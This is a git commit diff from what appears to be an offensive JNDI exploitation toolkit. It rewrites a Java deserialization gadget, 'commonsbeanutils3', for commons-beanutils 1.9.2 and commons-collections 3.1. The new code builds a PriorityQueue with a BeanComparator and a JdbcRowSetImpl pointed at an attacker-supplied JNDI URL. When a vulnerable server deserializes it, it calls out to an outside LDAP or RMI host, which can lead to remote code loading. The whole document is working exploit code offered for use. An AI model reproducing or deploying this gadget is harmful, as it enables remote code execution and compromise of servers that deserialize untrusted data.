e92c41a15c241eb3e41e9ebe58b8a5cfa4296d27
qi4l <nuxm771@163.com>
2024-03-12 10:16:52 +0800

    CB3

--- src/main/java/com/qi4l/jndi/gadgets/commonsbeanutils3.java
+++ src/main/java/com/qi4l/jndi/gadgets/commonsbeanutils3.java
@@ -1,48 +1,35 @@
 package com.qi4l.jndi.gadgets;
 
 import com.qi4l.jndi.enumtypes.PayloadType;
+import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Reflections;
+import com.sun.rowset.JdbcRowSetImpl;
 import org.apache.commons.beanutils.BeanComparator;
 
-import javax.naming.CompositeName;
-import java.lang.reflect.Constructor;
+import java.math.BigInteger;
 import java.util.PriorityQueue;
 
+@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1"})
 public class commonsbeanutils3 implements ObjectPayload<Object> {
 
     @Override
     public Object getObject(PayloadType type, String... param) throws Exception {
+        String jndiURL = null;
         if (param[0].toLowerCase().startsWith("jndi:")) {
-            param[0] = param[0].substring(5);
+            jndiURL = param[0].substring(5);
         }
 
-        if (!param[0].toLowerCase().startsWith("ldap://") && !param[0].toLowerCase().startsWith("rmi://")) {
-            throw new Exception("Command format is: [rmi|ldap]://host:port/obj");
-        }
+        BeanComparator comparator = new BeanComparator("lowestSetBit");
+        JdbcRowSetImpl rs         = new JdbcRowSetImpl();
+        rs.setDataSourceName(jndiURL);
+        rs.setMatchColumn("QI4L");
+        PriorityQueue queue = new PriorityQueue(2, comparator);
 
-        int    index = param[0].indexOf("/", 7);
-        String host  = param[0].substring(0, index);
-        String path  = param[0].substring(index + 1);
+        queue.add(new BigInteger("1"));
+        queue.add(new BigInteger("1"));
 
-        String query = path.replace("/", "\\");
-
-        Class       ldapAttributeClazz            = Class.forName("com.sun.jndi.ldap.LdapAttribute");
-        Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(new Class[]{String.class});
-        ldapAttributeClazzConstructor.setAccessible(true);
-        Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(new Object[]{"name"});
-
-        Reflections.setFieldValue(ldapAttribute, "baseCtxURL", host);
-        Reflections.setFieldValue(ldapAttribute, "rdn", new CompositeName(query + "//su18"));
-
-        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
-
-        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
-        queue.add("1");
-        queue.add("1");
-
-        Reflections.setFieldValue(comparator, "property", "attributeDefinition");
-        Reflections.setFieldValue(queue, "queue", new Object[]{ldapAttribute, ldapAttribute});
-
+        Reflections.setFieldValue(comparator, "property", "databaseMetaData");
+        Reflections.setFieldValue(queue, "queue", new Object[]{rs, rs});
         return queue;
     }
 }
